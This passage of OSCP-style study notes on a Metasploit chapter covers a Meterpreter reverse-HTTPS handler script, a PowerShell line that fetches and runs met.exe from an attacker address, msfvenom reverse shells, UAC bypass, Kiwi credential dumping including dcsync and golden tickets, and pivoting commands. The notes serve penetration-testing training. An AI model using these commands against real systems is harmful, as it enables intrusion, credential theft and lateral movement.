3. automatically migrate the Meterpreter process,
4. keep the listener alive for future connections,
5. run the handler in the background.

### Resource script contents

```text
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.119.4
set LPORT 443
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
run -z -j
```

### Explanation of each line

```text
use exploit/multi/handler
```

Activates the generic Metasploit payload handler.

```text
set PAYLOAD windows/meterpreter_reverse_https
```

Sets the expected incoming payload.

```text
set LHOST 192.168.119.4
```

Sets local callback/listening address.

```text
set LPORT 443
```

Sets listener port.

```text
set AutoRunScript post/windows/manage/migrate
```

Runs the migration post-module automatically when a session is created.

The chapter's migration module spawns a `notepad.exe` process and migrates Meterpreter into it.

```text
set ExitOnSession false
```

Keeps the handler running after a session connects, allowing additional incoming sessions.

```text
run -z -j
```

**Arguments:**

- `-j` — run as background job.
- `-z` — do not automatically interact with newly opened sessions.

### Inspect advanced options

Inside a module/payload:

```text
show advanced
```

Useful for options such as:

```text
AutoRunScript
ExitOnSession
```

### Launch msfconsole with a resource script

```bash
sudo msfconsole -r listener.rc
```

**Arguments:**

- `-r listener.rc` — execute the resource script during startup.

### Trigger the payload

On the target:

```powershell
iwr -uri http://192.168.119.4/met.exe -Outfile met.exe
.\met.exe
```

The chapter shows Metasploit:

- receiving the connection,
- applying `AutoRunScript`,
- spawning Notepad,
- migrating Meterpreter,
- leaving the handler running.

### Built-in resource scripts

List them:

```bash
ls -l /usr/share/metasploit-framework/scripts/resource
```

Examples shown in the chapter include:

```text
auto_brute.rc
autocrawler.rc
auto_cred_checker.rc
autoexploit.rc
auto_pass_the_hash.rc
auto_win32_multihandler.rc
portscan.rc
run_all_post.rc
smb_checks.rc
smb_validate.rc
wmap_autotest.rc
```

The chapter warns to review and understand existing resource scripts before using them.

### Global datastore

Normal:

```text
set
unset
```

apply to the current module context.

Global:

```text
setg
unsetg
```

apply values across modules.

This is useful in scripts when multiple modules should share values such as:

```text
RHOSTS
LHOST
```

> [!oscp-tip]
> A small personal library of resource scripts can save time for repetitive actions such as handlers, pivoting, and common enumeration. Keep them simple enough that you understand exactly what they do.

---

# 20.5 Wrapping Up

The chapter ties Metasploit together as a framework that can support a large portion of a penetration test.

Main capabilities covered:

- database-backed target tracking
- auxiliary scanning/enumeration modules
- exploit modules
- staged and non-staged payloads
- Meterpreter
- `msfvenom`
- multi/handler
- session and job management
- Windows privilege escalation
- process migration
- credential extraction with Kiwi
- pivot routing
- SOCKS proxying
- port forwarding
- resource-script automation

The central practical idea is that Metasploit reduces the overhead of managing many unrelated tools and shells by giving exploitation, payload handling, session management, and post-exploitation a common interface.

---

# Attack Chain Connection

The requested larger attack process is:

```text
Recon → Enumeration → Initial Access → Privilege Escalation → Credentials → Pivoting → AD → Proof
```

## Recon

Metasploit is not primarily introduced here as a passive-recon tool, but it can store and organize information discovered before or during active testing.

Relevant chapter commands:

```text
workspace -a <name>
db_nmap ...
hosts
services
```

**Connection:** Recon results become structured data in the MSF database.

## Enumeration

This is one of the strongest chapter connections.

Examples:

```text
db_nmap -A <target>
services
services -p 445
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/portscan/tcp
search type:auxiliary smb
```

**Goal:** identify services, versions, vulnerability indicators, and useful credentials.

## Initial Access

Exploit modules and generated payloads are used for footholds.

Examples:

```text
use exploit/multi/http/apache_normalize_path_rce
set RHOSTS <target>
set payload linux/x64/shell_reverse_tcp
run
```

or:

```bash
msfvenom -p windows/x64/shell_reverse_tcp ...
```

with:

```text
use exploit/multi/handler
```

**Goal:** convert a vulnerability or code-execution primitive into an interactive session.

## Privilege Escalation

Meterpreter and local exploit modules assist in raising privileges.

Examples:

```text
getsystem
search UAC
use exploit/windows/local/bypassuac_sdclt
set SESSION <id>
run
```

**Goal:** move from a low-privileged or medium-integrity shell to SYSTEM/high integrity when conditions permit.

## Credentials

The chapter connects elevated privilege to credential extraction.

Examples:

```text
load kiwi
creds_msv
creds_all
```

Also:

```text
creds
```

shows credentials stored in the Metasploit database.

**Goal:** obtain reusable usernames/passwords/hashes for lateral movement or domain attacks.

## Pivoting

This is another major focus of the chapter.

Examples:

```text
route add <subnet> <session>
route print
use post/multi/manage/autoroute
use auxiliary/server/socks_proxy
portfwd add ...
```

External tools can then be sent through the pivot:

```bash
proxychains xfreerdp ...
```

**Goal:** reach systems inaccessible directly from Kali.

## AD

The chapter does **not** perform a full Active Directory attack chain, but it prepares the pieces needed for one:

- credential theft with Kiwi
- Kerberos-related Kiwi commands
- `dcsync` / `dcsync_ntlm` capabilities
- credential reuse
- SMB lateral movement with `psexec`
- pivoting into internal networks

Relevant Kiwi commands:

```text
creds_kerberos
dcsync
dcsync_ntlm
golden_ticket_create
kerberos_ticket_list
kerberos_ticket_use
```

**Connection:** once you reach the AD network and obtain suitable credentials/privileges, these capabilities can support domain-focused actions. The actual AD methodology is covered elsewhere in PEN-200 rather than demonstrated end-to-end in this chapter.

## Proof

Metasploit helps you keep access organized and gather evidence of compromise.

Useful items:

```text
sessions -l
hosts
services
vulns
creds
loot
notes
```

In a machine-solving context, once access is obtained you still need to verify the security context and collect the required proof according to the lab/exam instructions.

Typical verification commands may include:

```bash
whoami
id
hostname
ipconfig
ip addr
```

The important chapter connection is that sessions and database records reduce the chance of losing track of which host was compromised, through which vector, and with which credential/session.

---

# Mini Cheat Sheet

> [!tip]
> These are the commands/reminders from this chapter that are most worth having beside you while solving a machine.

```bash
# 1. Initialize MSF database
sudo msfdb init

# 2. Launch Metasploit quietly
sudo msfconsole -q
```

```text
# 3. Create a clean workspace
workspace -a oscp-target

# 4. Nmap + import results
db_nmap -A <RHOST>

# 5. Find modules
search <keyword>
search type:auxiliary smb
search type:exploit <service-or-CVE>

# 6. Always inspect before running
info
show options
show missing

# 7. Basic module workflow
use <module>
set RHOSTS <target>
set RPORT <port>
set <OPTION> <value>
run

# 8. Use DB results as targets
services -p 445 --rhosts

# 9. Explicitly choose payload + verify callback
set payload <payload>
set LHOST <KALI/VPN-IP>
set LPORT <port>
show options

# 10. Session management
sessions -l
sessions -i <ID>
sessions -k <ID>

# 11. Jobs/background listeners
run -j
jobs

# 12. Meterpreter basics
sysinfo
getuid
shell
ps
background

# 13. Meterpreter file transfer
download <remote-file>
upload <local-file> <remote-path>

# 14. Windows privilege escalation helpers
getsystem
search UAC

# 15. Credential extraction
load kiwi
creds_msv

# 16. Generate a Windows reverse payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI-IP> LPORT=443 -f exe -o shell.exe

# 17. Generic handler
use exploit/multi/handler
set payload <EXACT-PAYLOAD-USED-IN-FILE>
set LHOST <KALI-IP>
set LPORT <port>
run -j

# 18. Pivoting
route add <INTERNAL-SUBNET/CIDR> <SESSION-ID>
route print
use post/multi/manage/autoroute

# 19. SOCKS pivot
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j

# 20. Port forward through Meterpreter
portfwd add -l <LOCAL-PORT> -p <REMOTE-PORT> -r <INTERNAL-HOST>
```

## Final OSCP Reminders

- Read `info` before launching unfamiliar exploit modules.
- Prefer `check` first when the module supports it.
- Explicitly set the payload; do not blindly trust defaults.
- Verify `LHOST` on systems with multiple interfaces.
- Match the `multi/handler` payload **exactly** to the generated payload.
- Staged basic shells need a Metasploit-aware handler; Netcat alone cannot deliver the second stage.
- `shell/reverse_tcp` is staged; `shell_reverse_tcp` is non-staged.
- Use `run -j` for listeners you want to keep in the background.
- `sessions` = interactive access; `jobs` = background MSF tasks.
- During pivoting, check whether the internal target can route back to Kali before choosing reverse vs bind payloads.
- Treat Meterpreter as powerful but detectable; do not assume HTTPS transport makes the payload itself invisible.
- Use workspaces and the database to keep host/service/credential information organized.

---

# Quick Mental Model

```text
Nmap / auxiliary modules
        ↓
MSF database
        ↓
search → use → info → show options
        ↓
set RHOSTS/RPORT/PAYLOAD/LHOST/LPORT
        ↓
check → run
        ↓
session
        ↓
Meterpreter / post modules
        ↓
getsystem → migrate → kiwi
        ↓
credentials
        ↓
route / autoroute / socks_proxy / portfwd
        ↓
internal targets
        ↓
resource scripts for repeatable automation
```
